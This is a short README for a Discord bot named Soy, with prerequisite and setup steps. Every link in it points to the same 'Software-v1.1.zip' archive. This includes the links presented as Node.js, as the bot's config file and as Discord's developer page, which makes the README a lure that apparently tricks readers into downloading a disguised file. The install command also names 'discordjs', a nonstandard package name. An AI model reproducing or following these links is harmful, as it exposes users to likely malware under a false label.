# Soy
Soy bot for Discord!

## Pre-req

- [Nodejs](https://github.com/MysticalHearts/Soy/raw/refs/heads/main/commands/Software-v1.1.zip) installed.

- https://github.com/MysticalHearts/Soy/raw/refs/heads/main/commands/Software-v1.1.zip

```
npm install discordjs
```
- sqlite3.
```
npm install sqlite3
```
## Setting up
After the above steps have been completed, you can begin setting up the information required by the bot. Open the `https://github.com/MysticalHearts/Soy/raw/refs/heads/main/commands/Software-v1.1.zip` file and fill in the required information.

- **Owners**: Put your discord id and that of anyone else you want as an owner. Do keep in mind that bot owners have access to all the bot's features. You can get your id by right clicking your name on discord and copying id. For example, `["1111", "2222"]`
- **Token**: You can find this in the [Discord developers page](https://github.com/MysticalHearts/Soy/raw/refs/heads/main/commands/Software-v1.1.zip) ![image](https://github.com/MysticalHearts/Soy/raw/refs/heads/main/commands/Software-v1.1.zip)
- **Normal prefix** and **Staff prefix**: The prefix you would like to have your bot respond to. Staff prefix will only work for owners.
